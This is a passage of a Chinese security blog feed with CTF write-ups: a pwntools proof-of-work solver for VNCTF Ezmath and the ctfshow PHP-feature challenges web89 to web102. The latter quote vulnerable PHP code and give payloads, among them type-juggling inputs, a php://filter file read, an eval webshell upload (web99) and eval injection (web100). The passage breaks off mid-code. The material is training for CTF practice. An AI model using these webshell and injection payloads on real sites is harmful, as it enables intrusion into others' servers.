    <summary type="html">&lt;h1 id=&quot;浅聊&quot;&gt;&lt;a href=&quot;#浅聊&quot; class=&quot;headerlink&quot; title=&quot;浅聊&quot;&gt;&lt;/a&gt;浅聊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;今天四级出分，没过，有些意料之中，但查到的那一刻还是有些出乎意料的，正好刚查完分数，家里突然没电了，不知道为甚么最</summary>
      
    
    
    
    <category term="闲聊" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF Ezmath</title>
    <link href="http://websec.space/2022/02/15/VNCTF%20Ezmath/"/>
    <id>http://websec.space/2022/02/15/VNCTF%20Ezmath/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-14T16:49:31.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VNCTF-Ezmath"><a href="#VNCTF-Ezmath" class="headerlink" title="VNCTF Ezmath"></a>VNCTF Ezmath</h1><p>比赛当天不会写nc的脚本我摆烂了，今天学习了一下，比想象的简单，记录一下。</p><p>描述一下题目，先是破解一下sha256加盐，但位数固定，很容易 2<sup>n</sup>-1 mod(15)==0</p><p><img src="https://img-blog.csdnimg.cn/3ae6dc9c395343bfa4e630b6488077b5.png" alt="img"></p><p>所用的库使用pwntools</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>简单的介绍：</p><blockquote><p>远程：sh = remote(“127.0.0.1”,10001)<br>关闭连接：sh.close()<br>sh.send(data)  发送数据<br>sh.sendline(data)  发送一行数据，相当于在数据后面加\n<br>sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时<br>sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n<br>sh.recvuntil(“Hello,World\n”,drop=fasle)  接受数据直到我们设置的标志出现<br>sh.recvall()  一直接收直到EOF<br>sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout<br>sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</p></blockquote><p>解题脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">def sha_256code(encode,salt):</span><br><span class="line">    str=string.ascii_letters+string.digits</span><br><span class="line">    for i1 in str:</span><br><span class="line">        for i2 in str:</span><br><span class="line">            for i3 in str:</span><br><span class="line">                for i4 in str:</span><br><span class="line">                    plain=i1+i2+i3+i4+salt</span><br><span class="line">                    encode1=hashlib.sha256(plain.encode()).hexdigest()</span><br><span class="line">                    if encode1==encode:</span><br><span class="line">                        return (i1+i2+i3+i4)</span><br><span class="line">sh = remote(&quot;node4.buuoj.cn&quot;,28028)</span><br><span class="line">sh.recvuntil(&quot;(&quot;,)</span><br><span class="line">sh.recvuntil(&quot;+&quot;,)</span><br><span class="line">salt=sh.recvuntil(&quot;)&quot;,).decode()[:-1]</span><br><span class="line">sh.recvuntil(&quot;== &quot;,)</span><br><span class="line">encode=sh.recvuntil(&quot;\n&quot;,).decode()[:-1]</span><br><span class="line">data=sha_256code(encode,salt)</span><br><span class="line">sh.sendline(data)</span><br><span class="line">for i in range(777):</span><br><span class="line">    sh.recvuntil(&quot;the &quot;)</span><br><span class="line">    num = sh.recvuntil(&quot;th&quot;).decode()[:-2].strip()</span><br><span class="line">    i+=1</span><br><span class="line">    print(i)</span><br><span class="line">    data2=int(num)*4</span><br><span class="line">    sh.sendline(str(data2))</span><br><span class="line">    sh.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">    sh.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-Ezmath&quot;&gt;&lt;a href=&quot;#VNCTF-Ezmath&quot; class=&quot;headerlink&quot; title=&quot;VNCTF Ezmath&quot;&gt;&lt;/a&gt;VNCTF Ezmath&lt;/h1&gt;&lt;p&gt;比赛当天不会写nc的脚本我摆烂了，今天学习了一下，比想象的简</summary>
      
    
    
    
    <category term="密码学" scheme="http://websec.space/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码学" scheme="http://websec.space/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow php的特性</title>
    <link href="http://websec.space/2022/02/15/ctfshow%20php%E7%9A%84%E7%89%B9%E6%80%A7/"/>
    <id>http://websec.space/2022/02/15/ctfshow%20php%E7%9A%84%E7%89%B9%E6%80%A7/</id>
    <published>2022-02-14T16:00:00.000Z</published>
    <updated>2022-02-15T04:41:38.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-php的特性"><a href="#ctfshow-php的特性" class="headerlink" title="ctfshow php的特性"></a>ctfshow php的特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_match的值传入数组为0</p><p>下面是intval的返回值的介绍，所以直接传入一个不为0的数组即可。</p><p><img src="https://img-blog.csdnimg.cn/dfd7bc9a2d47419198458b4c951ad0ab.png" alt="img"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[]=a</span><br></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用php的弱类型</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=4476a</span><br></pre></td></tr></table></figure><h2 id="web91-preg-match的几种模式"><a href="#web91-preg-match的几种模式" class="headerlink" title="web91(preg_match的几种模式)"></a>web91(preg_match的几种模式)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在此介绍一下preg_match的几种模式</p><blockquote><p>**i      **</p><p>如果设定此修正符，模式中的字符将同时匹配大小写字母。</p><p><strong>m</strong>    </p><p>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p><p><strong>s</strong><br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p><p><strong>x</strong><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</p><p><strong>e</strong><br>如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，</p></blockquote><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=a%0aphp</span><br></pre></td></tr></table></figure><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个卡了一下，主要是前后这个不好搞，还是从intval下手</p><p><img src="https://img-blog.csdnimg.cn/95969d4eda2a4e80a67803b195995892.png" alt="img"></p><p>使用十六进制成功找到突破口</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=0x117c</span><br></pre></td></tr></table></figure><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>匹配了大小写字母，十六进制的方法无了</p><p>payload使用八进制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br></pre></td></tr></table></figure><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把八进制的路子也堵住了，采用分数的形式</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=4476.0</span><br></pre></td></tr></table></figure><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型难搞啊，但是灵机一动，加个+这种没用的符号就搞定了，空格也可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=+010574</span><br><span class="line">num= 010574</span><br></pre></td></tr></table></figure><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题比较简单</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num=./flag.php</span><br><span class="line">num=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>很基础的题目了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>md5，传入两个数组会返回faulse</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>读懂题意即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP_FLAG=flag</span><br><span class="line">[post data]</span><br><span class="line">HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面他要干啥没仔细看，直接ok</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n=1.php</span><br><span class="line">[post data]</span><br><span class="line">content=&lt;?php eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web100-优先级"><a href="#web100-优先级" class="headerlink" title="web100(优先级)"></a>web100(优先级)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP里面 <code>=</code>的优先级是比<code>and</code>优先级高</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=var_dump(get_class_vars&amp;v3=);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=eval($_POST[1]) ?&gt;%23&amp;v3=;</span><br></pre></td></tr></table></figure><p>这里有点坑，读到的flag，需要将中间的0x2d给替换掉。改为-</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处用反射类来输出ctfshow类</p><h3 id="Reflectionclass"><a href="#Reflectionclass" class="headerlink" title="Reflectionclass"></a>Reflectionclass</h3><p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    